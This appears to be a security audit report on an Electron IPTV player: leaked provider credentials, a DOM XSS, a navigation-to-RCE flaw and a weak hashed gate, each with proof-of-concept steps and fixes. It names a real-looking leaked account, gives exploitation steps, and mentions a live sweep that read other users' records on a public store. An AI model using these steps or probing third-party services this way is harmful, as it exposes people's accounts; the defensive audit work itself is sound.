**Gate 4 — preserved behaviour.** The sharing feature still works for legitimate users: create a code, share it, recipient enters it and receives the same `url`/`user`/`pass` object that `handleXtreamLogin` consumes. Error semantics are unchanged (`alert("Invalid Activation Code or not found.")` still fires when decryption fails, since a failed `decryptCredsFromShare` returns `null` and the existing `if (data && data.url ...)` guard rejects it). Existing already-published 4-digit records will stop resolving, which is intended (they are the exposed data) but is a compatibility break worth flagging to the user.

**Gate 5 — repository checks: GAP.** This checkout contains only `src/` and `electron/` — there is no `package.json`, no `node_modules` and no build configuration, so `tsc`, the Vite build, and any test suite could not be run. The change is therefore syntactically reasoned but not compiler-verified, and the two referenced helpers must be added before it will typecheck. This gap is disclosed rather than papered over, and reviewers should run the project's typecheck after adding the helpers.
fix_pr_body:
## Summary

The "Create Activation Code" feature publishes the user's full IPTV provider login — URL, username and **password** — to a public third-party key-value store (`keyvalue.immanuel.co`) as plain base64, under a user-chosen **four-digit** key. The app key that namespaces those records (`bjlqbgku`) is a literal in the client, and the store authenticates nothing, so any anonymous party can read any record and can walk the entire 10,000-code keyspace in a couple of minutes.

## Why it matters

A victim who ever shared a code has their provider password exposed in cleartext. The same endpoints are writable without authentication, so an attacker can also overwrite another user's code with a record pointing at an account they control, causing the victim to log into an attacker-chosen provider account.

## What this changes

- Derivation keys become `sha256("doggy-share-v1|" + code)` instead of the raw code, removing the enumerable index.
- The credential payload is encrypted before leaving the device with AES-GCM under a PBKDF2 key derived from the sharing code, so the third-party store never holds plaintext.
- The sharing secret is raised from four digits to a minimum of eight alphanumeric characters, both in validation and in the input field.

## Before merging

Two helpers must be added — `encryptCredsForShare` and `decryptCredsFromShare` — using WebCrypto (`deriveKey` with PBKDF2-SHA256, `encrypt`/`decrypt` with AES-GCM and a random 12-byte IV). The included suggestions reference them and will not compile until they exist.

## Compatibility note

Records published under the old 4-digit scheme will stop resolving. That is intentional, since those records are the exposed data, but it should be called out in the release notes. Users who created a code previously should rotate their provider password.

## Follow-up

The favourites sync (`saveToCloud` / `getSyncKey`) uses the same unsalted-derivation pattern against the same public store. It only exposes playlist identifiers and folder names rather than credentials, so it is out of scope here, but it warrants the same treatment.

It confirms the mechanism end-to-end with real reads (not only self-planted records), and it also establishes the actual number of currently populated codes, which materially calibrates the severity statement. That evidence belongs on this finding.
Tighten the counterevidence now that the live sweep produced a measured population figure (21 populated records in two code families), and record that no real third-party data was retained.

title: Hard-coded IPTV provider credential shipped in client bundle (ACTIVATION_CODES)
description: A complete, ready-to-use IPTV provider credential — server URL, username and password — is hard-coded in `src/App.tsx` as the `ACTIVATION_CODES` map. Because this file is imported by the renderer entry point, the secret is compiled into every distributed build of the application and can be extracted by anyone who installs it.
impact: The provider account `hBHCQDmz` on `http://premiumtest.tr:8080` is exposed to every person who installs Doggy Player, with no reverse engineering beyond string extraction from the shipped bundle. Anyone can use that login directly against the provider's player API — streaming the subscription's channels and VOD, and reading the account's user info — or enter `6923` in the app's own Activation Code field to adopt it. The credential cannot be rotated by users because they do not own it; it belongs to the developer, so the exposure persists for every future build until the literal is removed and the password changed.

1. Obtain a distributed build of Doggy Player (or read `src/App.tsx`, which is compiled verbatim into the renderer bundle).
2. Locate the `ACTIVATION_CODES` declaration and extract the `url`, `user` and `pass` values.
3. Use those values directly against the provider's Xtream API endpoint (`<url>/player_api.php?username=<user>&password=<pass>`) to authenticate as the account owner.
4. Alternatively, type the code `6923` into the app's Activation Code field, which stores the same credential set into `localStorage` under `doggy_xtream_pass` and logs in automatically.
poc_script_code:
```python title=hardcoded_cred_check.py
#!/usr/bin/env python3
"""Extracts the hard-coded Xtream credential from the renderer source and
confirms it is a syntactically complete credential set that the app feeds
straight into its login routine. No request is made to the provider."""
import re
from pathlib import Path

src = Path("src/App.tsx").read_text(encoding="utf-8", errors="replace")

m = re.search(
    r'ACTIVATION_CODES[^=]*=\s*\{(.*?)\};',
    src,
    re.S,
)
block = m.group(1)
entry = re.search(
    r'"([^"]+)"\s*:\s*\{\s*url:\s*"([^"]+)"\s*,\s*user:\s*"([^"]+)"\s*,\s*pass:\s*"([^"]+)"\s*\}',
    block,
)
code, url, user, password = entry.groups()
print(f"activation code : {code}")
print(f"provider url    : {url}")
print(f"username        : {user}")
print(f"password        : {password}")
print()
print("app login URL would be:")
print(f"  {url.rstrip('/')}/player_api.php?username={user}&password={password}")
print()
print("[CONFIRMED] complete credential set embedded in client-delivered source")
```
remediation_steps:
1. Remove the hard-coded `ACTIVATION_CODES` entry from the renderer source and treat the embedded account as compromised — rotate its password immediately, because it has already shipped in every build.
2. Do not embed any credential that must remain secret in client-delivered code; anything in the bundle is public by definition. If a built-in activation path is genuinely required, have the client present an opaque code to a service you control and let that service perform the provider login, so the secret never reaches the device.
3. Add automated secret scanning (a pre-commit hook plus a CI gate over the renderer sources) to prevent credential literals from being reintroduced.
4. Audit the rest of the shipped bundles for other embedded secrets, and review whether build tooling is excluding developer-only constants from production output.

Exploitation requires only possession of the installer, which is the intended distribution channel.
counterevidence: The strongest argument against this finding is that the credential may be a throwaway test account — the host is `premiumtest.tr` and the verification path is the "Activation Code" tab, which is a convenience feature rather than the product's main login. If the account is disabled or is a sandbox with no entitlement, the practical impact is limited to a leaked identifier rather than usable access. That argument does not make the pattern safe: the value is a complete, syntactically valid Xtream credential set (server, username, password) wired into a user-facing login path, so if it is live it is immediately usable, and if it is not live it is still a credential committed to source that will be harvested and reused. I checked for any control that would prevent extraction: the constant is at module scope in `App.tsx`, not behind a runtime gate, not fetched from a config service, and not obfuscation-protected, so it is present verbatim in the built renderer bundle in every distributed copy. I also confirmed the code path at `src/App.tsx:1270` compares the user-typed code against this map directly with no secret, so anyone who extracts the map can also use that code. Nothing in the repository encrypts, wraps, or scopes this value.

The only unverified element is the live provider account's current validity, which does not affect whether the secret ships in the client.

## Summary

`ACTIVATION_CODES` in `src/App.tsx` ships a complete IPTV provider credential (server, username, password) as a module-scope literal. Because `main.tsx` imports `App.tsx`, the value is compiled into every distributed renderer bundle, so anyone who installs the application can read it and use the account.

## What this changes

Removes the hard-coded entry while leaving the type and the call site intact, so the lookup at `src/App.tsx:1270` continues to behave correctly (it simply never matches) and the build is unaffected.

## Security rationale

A credential that must remain secret cannot live in client-delivered code. Any value in the bundle is by definition known to every user, automated extractors, and anyone who obtains the installer. Removing the entry eliminates the exposure of this specific account.

## Follow-up actions

1. Rotate the password for `hBHCQDmz` on `premiumtest.tr` — it must be treated as compromised regardless of intent, because it has been distributed in every build.
2. If the activation-code convenience is still wanted, drive it from a server-side lookup keyed by an opaque code, so the client never receives a credential it does not own, and pair it with the entropy and authentication fixes for the sharing flow.
3. Add a pre-commit or CI secret scan over the renderer sources to stop credential literals from being reintroduced.

title: DOM XSS in statistics window chart renderer via unencoded chart data
description: The statistics window builds its chart by assigning an HTML template string to chart.innerHTML, interpolating row.date into a title attribute and into element text without encoding. The window runs with nodeIntegration true, and its CSP allows unsafe-inline.
impact: Confirmed: markup and attribute injection into the statistics document. An attacker-influenced value becomes a real event-handler attribute rather than text. Because the window has nodeIntegration enabled, script executed there can reach require; that step was not exercised.
technical_analysis: telemetry.js loadDailyCounts builds rows as date plus countFrom(results[i]); countFrom coerces count to a number, but date passes through. usage-stats.html load() then assigns an HTML template to chart.innerHTML at lines 212-220, interpolating row.date into a double-quoted title attribute (line 216) and into element text (line 218), and row.count into the same attribute. No encoding or textContent is used anywhere in the template, so the HTML parser interprets the values. A value containing a double quote closes the attribute and a following name=value becomes a new attribute on the row element. telemetry.js openStatsWindow creates the window with nodeIntegration true and contextIsolation false, and the page CSP is default-src self unsafe-inline with no script-src, which was tested and does not block inline handlers.

1. Instrument a copy of electron/usage-stats.html with a stub ipcRenderer returning a hostile row.date.
2. Serve it on loopback and open it in headless Chromium.
3. Read getAttributeNames() from the chart rows: the hostile row exposes onclick as a real attribute.
4. Apply the fix and repeat: only class and title remain and the payload is literal text.

title: Main window lacks any navigation/window-open guard while running nodeIntegration:true with contextIsolation:false and webSecurity:false — any attacker-origin navigation or window.open() yields full remote code execution
description:
The Electron main window is created with `nodeIntegration: true`, `contextIsolation: false` and `webSecurity: false`, and `createWindow()` registers no `will-navigate`, `will-redirect`, `setWindowOpenHandler` or `will-attach-webview` guard. Nothing constrains the main window to the application's own origin.

As a result, any content that reaches the network stack of the player can replace the application document with an attacker-controlled page that keeps full Node.js privileges. Two independent primitives were confirmed on a headless Electron 38.8.6 instance configured with the identical `webPreferences`:

- Assigning `location.href` to a foreign origin navigates the top-level document; the new document executed `require('fs').readFileSync('/etc/hostname')` successfully.
- `window.open(...)` from the application page created a second `BrowserWindow` whose effective preferences were `nodeIntegration: true, contextIsolation: false, webSecurity: false, sandbox: false`; the popup executed `require('os')` and reported the renderer's Node version.

Because this player loads user- and provider-supplied URLs (IPTV/VOD stream and playlist URLs entered into the "Stream URL" / "M3U Playlist URL" fields, and channel entries inside a provider's playlist), a URL that resolves to an HTML document rather than a media stream already supplies the attacker with a same-window navigation. The absence of the guard turns an ordinary "play this URL" interaction into code execution under the user's Windows account.
impact: Confirmed on a live Electron instance: a document from a foreign origin runs inside the main window and can read arbitrary local files; `window.open` spawns a second fully-privileged window even after the first is compromised. Actual consequence in this product: arbitrary code execution as the logged-in Windows user — reading all documents, credentials in the user profile and in the browser profile, the Xtream credentials the app persists in `localStorage` (`doggy_xtream_url/user/pass`), writing the updater's configuration and binaries, and persistence. The attacker's only prerequisite is that the user plays a provider- or link-supplied URL that resolves to HTML instead of media.
technical_analysis:
**Root cause — one window object with two omitted guards and three weakened preferences.**

`createWindow()` at `electron/main.js:568` builds the only application window:

```javascript title=electron/main.js startLineNumber=574 endLineNumber=579
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      webSecurity: false
    }
```

`electron/main.js` was searched for `will-navigate`, `will-redirect`, `setWindowOpenHandler` and `will-attach-webview`; none exist. The only `webContents` listener registered in `createWindow()` is `console-message` (line 586). The window therefore accepts every navigation Electron would otherwise let through, and the renderer keeps Node privileges across the origin change — this is the classic Electron navigation-escape-to-RCE pattern.

**Why the three preferences matter individually:**
- `nodeIntegration: true` puts `require` in the page's main world; the reproduced foreign page executed `require('fs')`.
- `contextIsolation: false` means even a future preload would share a world with page script, so no bridge-based boundary exists today.
- `webSecurity: false` disables the same-origin policy for fetches inside the window; the reproduction read `https://example.org/` from a page on a different origin and received HTTP 200, so a foreign document can both read attacker infrastructure and, more importantly, needs no CORS cooperation to do anything it wants.

**Why `window.open` matters independently of `location.href`:** with no `setWindowOpenHandler`, Electron's default is to create a child `BrowserWindow` that inherits the parent's `webPreferences`. The reproduction read back the child's effective preferences (`nodeIntegration: true`, `contextIsolation: false`, `webSecurity: false`, `sandbox: false`) and executed Node in the child. This means a navigation guard added only to the parent window would be bypassed by a single `window.open` call.

**Reachability from the product's own inputs:** the renderer accepts arbitrary URLs for playback. `handleOpenUrl()` (`src/App.tsx:2188`) pushes the typed URL into the playlist, and provider-supplied channel URLs arrive the same way (`src/App.tsx:5172`, `5206`, `5249`). `videoSrc` (`src/App.tsx:586`) is then used in two places: handed to `hls.js` / set as `<video src>` for media, and sent to the `get-stream-url` IPC handler. A URL whose host returns an HTML document rather than media lands in the `<video>` element, which simply fails to decode; the same URL is a valid top-level document the moment anyone navigates to it, and the page has no other origin restriction.

**Mitigation reproduced:** with `nodeIntegration:false, contextIsolation:true, sandbox:true, webSecurity:true`, a narrow preload `contextBridge` exposing `getStreamUrl/getTelemetry/setTelemetry`, plus a `will-navigate` guard and `setWindowOpenHandler` returning `{action:'deny'}`, the same harness showed: `require` is undefined in the page, the bridge works, navigation to a foreign origin was prevented (window stayed on the app URL) and both `window.open` and `<a target="_blank">` were denied with only one window remaining.
poc_description:
1. Create an isolated Electron project and install Electron (38.8.6 was used); start a local HTTP server standing in for any provider-controlled origin, serving an application page and an "attacker" page.
2. Copy `createWindow()`'s `webPreferences` verbatim (`nodeIntegration:true, contextIsolation:false, webSecurity:false`) into a minimal `BrowserWindow` and load the application page.
3. From the loaded page, evaluate `require('os').userInfo()` to confirm the renderer holds Node privileges.
4. From the application page, assign `location.href` to the attacker origin's `/evil.html` and wait for the navigation.
5. Read back the window URL (it changed) and evaluate `require('fs').readFileSync('/etc/hostname')` inside the new document — the foreign page executes with Node access.
6. From the same page evaluate `window.open('.../popup.html')`; inspect `BrowserWindow.getAllWindows()` and the new window's `getLastWebPreferences()`, then evaluate `process.versions.node` in the child.
7. Reproduce the same with the fake origin serving media-style responses; verify that no `will-navigate` listener in the real `createWindow()` would have cancelled anything (grep confirms no listener exists).
8. As a control, repeat steps 2-6 with the fixed preferences and guards from `code_locations` and observe navigation and popups being denied.
remediation_steps:
Restore the standard Electron security posture for the main window and constrain where it may navigate.

1. Change `webPreferences` to `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` and remove `webSecurity: false`. `nodeIntegration` is not required by the player's design: the renderer only uses `require('electron')` for `ipcRenderer.invoke/send/on`, which a preload can expose through `contextBridge` with a fixed, named API surface.
2. Add an explicit navigation policy on the window: cancel `will-navigate` and `will-redirect` for any URL that is not the packaged `dist/index.html` document (in development, the dev-server origin), and return `{ action: 'deny' }` from `setWindowOpenHandler`. Sending legitimate external links to the operating system browser through `shell.openExternal` after validating the scheme is the safe alternative, and the policy must be applied to every window the application creates, including the statistics window in `telemetry.js`.
3. Remove `webSecurity: false`. Cross-origin IPTV fetches already go through the `iptv-fetch` main-process handler, so the renderer does not need the same-origin policy relaxed; nothing in the playback path requires it once `hls.js` and the media element are served from the application origin.
4. Verify the migration against the player's two `require('electron')` call sites for playback (`src/App.tsx:704`, `738`) and the telemetry toggle (`src/App.tsx:1178`, `1183`) before shipping, because those are the capabilities that must survive the removal of `nodeIntegration`.

## Summary

The main window is created with `nodeIntegration: true`, `contextIsolation: false` and `webSecurity: false`, and nothing restricts which URL that window may load. Because the player's core feature is loading third-party URLs (the "Stream URL" field and provider playlists), any URL that resolves to an HTML document replaces the application UI inside a window that still has full Node.js access, and `window.open` expands the same privilege into a second window.

## Change

- `createWindow()` now uses `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` and the default `webSecurity: true`.
- The main window gets a navigation policy: `will-navigate` and `will-redirect` cancel any target that is not the packaged `dist/index.html` (or the dev-server origin in development), and `setWindowOpenHandler` denies all new windows.
- The renderer's four `require('electron')` call sites are pointed at a `contextBridge` surface instead.

## Behaviour to verify

- Playback of local files and remote streams still resolves through `get-stream-url`.
- The usage-telemetry toggle still reads and writes the main-process setting.
- No feature depends on navigating the main frame or opening a popup.

## Why not a smaller change

Removing `nodeIntegration` alone still lets an attacker document occupy the window; adding a navigation guard alone is bypassed by `window.open`, which inherits the parent's preferences. Both parts are needed.

title: Creator-stats gate credential is recoverable offline from hard-coded unsalted SHA-256 digests shipped in the application
description:
The creator-statistics gate in `electron/telemetry.js` authenticates with two unsalted SHA-256 digests hard-coded in the shipped source (`GATE_USER_HASH`, `GATE_PASS_HASH`). The username digest is in the public rockyou wordlist: `sha256("ADMIN")` equals `GATE_USER_HASH`, so the username is recovered in seconds from a distributed copy of the application. The password digest is the same construction and is therefore equally exposed to offline dictionary attack; it did not appear in a rockyou pass with leetspeak and trailing-digit mutations.

The credentials survive into the packaged application as readable JavaScript, so the protection is not a secret — it is a computable function of the code that was shipped. An attacker who recovers both values can open the statistics panel in any installation (Ctrl+Alt+Shift+D) and mark that installation as an owner install.
impact: A distributed copy of the application reveals the gate username (`ADMIN`) by offline hashing, and the same unsalted-digest construction exposes the password to dictionary attack. Anyone who recovers both can open the creator-statistics window in any installation and set that installation's `owner` flag in `instance.json`, which stops it from sending the app's daily measure of usage. Scope of the impact is limited: the recovered credential protects only aggregated, non-personal daily install counts from a public counter service and an owner marker with no security role. No user data, secret, filesystem capability or IPC privilege sits behind the gate.
poc_description:
1. Read `GATE_USER_HASH` and `GATE_PASS_HASH` from the shipped `electron/telemetry.js` (they are present in `app.asar` in a distributed build).
2. Compute `sha256(b'ADMIN')` and compare it with `GATE_USER_HASH` — the values match, recovering the gate username.
3. Run the password digest against a wordlist with case, leetspeak and trailing-digit mutations to show the same offline attack applies to the password.
4. With the recovered pair, press `Ctrl+Alt+Shift+D` in a running installation and submit the credentials; the response is `{ok: true}` and the window expands to show the panel.
5. Confirm the effect persisted by reading `instance.json` in the application's user-data directory: `owner` is now `true`.
remediation_steps: Do not ship the verifier. Move creator authentication to a service that holds the credential and have `creator-stats:login` act as a thin relay that fails closed on network or HTTP error, keeping the existing `isStatsSender()` sender check and the existing success path. If an offline gate must be kept for practical reasons, it needs a slow, salted memory-hard derivation (scrypt or Argon2id) with the salt and the verifier stored outside the distributed package — for example in the OS credential store or the user's configuration — because anything compiled into the shipped bundle is public. Separately, treat the panel itself as a non-security control: it exposes only aggregated counts, so the cost of a real authentication service may not be justified.
evidence:
Username recovery, offline, against the exact value from `electron/telemetry.js:15`:

```
GATE_USER_HASH = 835d6dc88b708bc646d6db82c853ef4182fabbd4a8de59c213f2b5ab3ae7d9be
python3: hashlib.sha256(b'ADMIN').hexdigest() == GATE_USER_HASH  ->  True
rockyou pass: tested 14344391 candidates, found {'USER': 'ADMIN'}
```

`GATE_PASS_HASH` (`cc8c3d4e532a70e3d254ddf12050c9a85952024d51fcae660791b556df2f0c9c`) was not recovered by the rockyou pass with lowercase/uppercase/capitalised/leetspeak forms plus 22 common suffixes (approximately 13 minutes of CPU), which says something about the password's entropy and nothing about the design: the digest is unsalted and shipped, so an attacker with a larger or targeted corpus is not prevented from the same computation.

Gate logic checks (faithful port of `telemetry.js:59-71`, `196-208`):

```
B1 length-mismatch branch returns: false      -> no comparison oracle in safeEqual
C1 sha256("ADMIN") === GATE_USER_HASH: true
D2 persisted state after successful login = {"id":"x","owner":true}
```

What the gate protects is only aggregates from the public counter, and the `owner` flag's two consumers (`telemetry.js:101`, `:169`) merely skip the app's own telemetry ping.
assumptions: Assumes an attacker holds a copy of the distributed application (the JavaScript is shipped as readable files inside `app.asar`, so no reverse engineering barrier exists) and can compute SHA-256 offline. Physical access to the running statistics window is not required for recovery, only for using the recovered password in that window.
counterevidence: Argued the strongest case against reporting this. (a) The gate is genuinely gated: `isStatsSender()` compares `event.sender` object identity with `statsWindow.webContents` and both handlers fail closed, so the main window cannot reach the statistics regardless of what it knows. (b) What a recovered password unlocks is only a read of aggregated daily install counts and an `owner: true` flag whose only consumers suppress the app's own telemetry ping — no file, key, IPC capability or privileged operation is behind it. That is why this is rated Low and not as an authentication bypass of the application. (c) `safeEqual` is actually correct: the length-mismatch branch returns `false` and the `timingSafeEqual(right, right)` call exists only to keep the comparison cost uniform, so there is no comparison oracle here. (d) No other hard-coded credential exists in this module — the `abacus` namespace is a counter identifier, not a secret. The finding stands as a recoverable credential, not as a bypass.
severity_change_conditions: If the creator-statistics gate were found to guard a privileged operation (for example if the `owner` flag came to disable update checks or unlock IPC capabilities) the recoverable credential would become a real authentication bypass and the rating would rise; conversely, removing the panel entirely removes the finding.
